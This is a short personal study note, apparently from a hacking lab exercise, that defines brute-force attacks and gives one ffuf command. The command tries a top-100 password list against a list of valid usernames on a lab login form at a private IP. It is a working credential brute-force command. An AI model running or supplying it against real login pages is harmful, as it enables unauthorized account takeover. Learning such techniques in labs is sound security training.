---
title: Bruteforce
updated: 2022-11-23T14:25:33.0000000+04:00
created: 2022-11-23T13:55:12.0000000+04:00
---

Bruteforce
Wednesday, November 23, 2022
1:55 PM
A brute force attack is an automated process that tries a list of commonly used passwords against either a single username or, like in our case, a list of usernames.

**When running this command, make sure the terminal is in the same directory as the valid_usernames.txt file.**

ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d **"username=W1&password=W2"** -H **"Content-Type: application/x-www-form-urlencoded"** -u <http://10.10.9.131/customers/login> -fc 200

